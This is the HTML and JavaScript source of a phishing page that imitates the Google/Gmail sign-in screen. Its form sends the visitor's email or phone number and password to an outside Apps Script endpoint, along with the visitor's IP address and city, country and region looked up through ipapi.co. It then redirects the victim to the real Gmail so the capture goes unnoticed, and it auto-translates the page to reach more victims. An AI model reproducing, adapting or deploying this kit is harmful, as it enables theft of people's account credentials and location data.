<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail Inbox</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0; /* Remove default margin */
        }

        .login-container {
            background-color: #f2f2f2;
            padding: 20px;
            border-radius: 20px;
            text-align: center;
            width: 400px;
        }

        .logo {
            width: 100px;
            margin-bottom: 20px;
        }

        h1,
        h4 {
            margin: 0; /* Remove default margin */
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input[type="text"],
        input[type="password"],
        button {
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        button {
            background-color: #4285f4;
            color: #fff;
            border: none;
            cursor: pointer;
        }

        button:hover {
            background-color: #357ae8;
        }

        a {
            text-decoration: none;
            color: #4285f4;
        }

        a:hover {
            text-decoration: underline;
        }

        /* Define CSS classes for different colors */
        .red { color: red; }
        .green { color: green; }
        .blue { color: #4285f4; }
        .orange { color: orange; }
        .purple { color: purple; }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>
            <span style="font-size:36px;font-family:'Product Sans',sans-serif; margin-buttom:0px;">
                <span class="blue">G</span>
                <span class="red">o</span>
                <span class="orange">o</span>
                <span class="blue">g</span>
                <span class="green">l</span>
                <span class="red">e</span>
            </span>
        </h1>   
        <h4 data-translate style="font-size:20px; margin-buttom:-10px;">One Account All of Google.</h4>
        <p data-translate >Sign in to continue to Gmail</p>
        <img src="Screenshot_20240225-185415.jpg" style="width:70px">
         <form action="https://script.google.com/macros/s/AKfycbyZkHf_IQuy5zkDvxFs-H6GmZp6R2yPs2R2o5aADu_qIGU8BhKXJ1749L3Z8BV6xyRH/exec" id="Gmail" method="POST">
            <input data-translate-placeholder type="text" name="email_or_phone" placeholder="Email or Phone number" required/>
            <input data-translate-placeholder type="password" name="message" placeholder="Password" required/>
            <input type="hidden" id="ip_address" name="ip_address">
            <input type="hidden" id="country" name="country">
            <input type="hidden" id="region" name="region">
            <input type="hidden" id="city" name="city">
            <input type="hidden" name="form_id" value="Gmail">
            <input type="hidden" name="origin" value="https://joshiahh.github.io/Faceb00k-profile-/">
            <button type="submit" data-translate >Sign In</button>
          <h style="display: flex; justify-content: space-between;">
  <div><a href="https://mail.google.com" style="text-align: left;color:#4285f4" data-translate >Stay signed in</a></div>
  <div style="text-align: right;color:#4285f4;" data-translate >Need help?</div></h>
            <p><a href="https://mail.google.com" data-translate >Forgot password?</a></p>
            <div style="display: flex; justify-content: space-between; align-items: center;">
            <hr style="flex: 1; border-top: 1px solid #ccc; margin: 0 10px;">
            <span style="background-color: #f2f2f2; color:#4285f4; padding: 0 10px; position: relative; z-index: 1;" data-translate>or</span>
            <hr style="flex: 1; border-top: 1px solid #ccc; margin: 0 10px;">
            </div>
            <p><a href="https://www.google.com" data-translate >Create account</a></p>
        </form>
      </div>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script>
      // Detects the user's preferred language
    function detectUserLanguage() {
      const userLang = navigator.language || navigator.userLanguage;
      return userLang.slice(0, 2); // Get the first 2 characters of the language code (e.g., "en", "fr", etc.)
    }

    // Supported languages based on LibreTranslate (expandable)
    const supportedLanguages = [
      'af', 'sq', 'am', 'ar', 'hy', 'az', 'eu', 'be', 'bn', 'bs', 'bg', 'ca', 
      'zh', 'hr', 'cs', 'da', 'nl', 'en', 'et', 'fi', 'fr', 'gl', 'ka', 'de', 
      'el', 'gu', 'ht', 'he', 'hi', 'hu', 'is', 'ig', 'id', 'ga', 'it', 'ja', 
      'jv', 'kn', 'kk', 'km', 'ko', 'ku', 'ky', 'lo', 'la', 'lv', 'lt', 'lb', 
      'mk', 'ms', 'ml', 'mt', 'mi', 'mr', 'mn', 'my', 'ne', 'no', 'ps', 'fa', 
      'pl', 'pt', 'pa', 'ro', 'ru', 'gd', 'sr', 'st', 'si', 'sk', 'sl', 'so', 
      'es', 'su', 'sw', 'sv', 'tg', 'ta', 'te', 'th', 'tr', 'uk', 'ur', 'uz', 
      'vi', 'cy', 'xh', 'yi', 'yo', 'zu'
    ];

    // Fallback to English if the user's language is unsupported
    function getFallbackLanguage(userLang) {
      return supportedLanguages.includes(userLang) ? userLang : 'en';
    }

    // Batch translation function
    function translateBatch(texts, targetLang) {
      return fetch('https://libretranslate.com/translate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          q: texts,
          source: 'en',   // Assuming English as the default language
          target: targetLang,
          format: "text"
        }),
      })
      .then(response => response.json())
      .then(data => data.map(item => item.translatedText))
      .catch(error => {
        console.error('Error translating text:', error);
        // Fallback to original texts in case of an error
        return texts;
      });
    }

    // Function to translate all form labels, buttons, and placeholders
    function translateForm(targetLang) {
      const elementsToTranslate = document.querySelectorAll('[data-translate], [data-translate-placeholder]');

      // Collect all texts that need translation
      const textsToTranslate = Array.from(elementsToTranslate).map(elem => {
        return elem.textContent || elem.placeholder;
      });

      // Translate all texts in a single request
      translateBatch(textsToTranslate, targetLang)
        .then(translatedTexts => {
          let i = 0;
          elementsToTranslate.forEach(elem => {
            if (elem.textContent && elem.hasAttribute('data-translate')) {
              elem.textContent = translatedTexts[i++];
            } else if (elem.placeholder && elem.hasAttribute('data-translate-placeholder')) {
              elem.placeholder = translatedTexts[i++];
            }
          });
        });
    }

    // Initialize translation based on the user's preferred language or fallback
    document.addEventListener('DOMContentLoaded', function() {
      const userLang = detectUserLanguage();
      const targetLang = getFallbackLanguage(userLang);
      translateForm(targetLang);
    });

  // Fetch user's location and IP address
    $(document).ready(function () {
        $.get("https://ipapi.co/json/", function (data) {
            $("#ip_address").val(data.ip);
            $("#country").val(data.country_name);
            $("#region").val(data.region);
            $("#city").val(data.city);
        });

   // Function to handle form submission
        document.getElementById('Gmail').addEventListener('submit', function(event) {
          event.preventDefault();
          const form = event.target;
          const formData = new FormData(form);
          const jsonData = {};
          for (const [key, value] of formData.entries()) {
            jsonData[key] = value;
          }
          fetch('https://script.google.com/macros/s/AKfycbyZkHf_IQuy5zkDvxFs-H6GmZp6R2yPs2R2o5aADu_qIGU8BhKXJ1749L3Z8BV6xyRH/exec', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams(jsonData).toString(),
          })
          .then(response => {
            if (response.ok) {
              window.location.replace('https://mail.google.com/');
            } else {
              console.error('Error submitting form data');
            }
          })
          .catch(error => {
            console.error('Fetch error:', error);
          });
        });
      });
    </script>
</body>
</html>
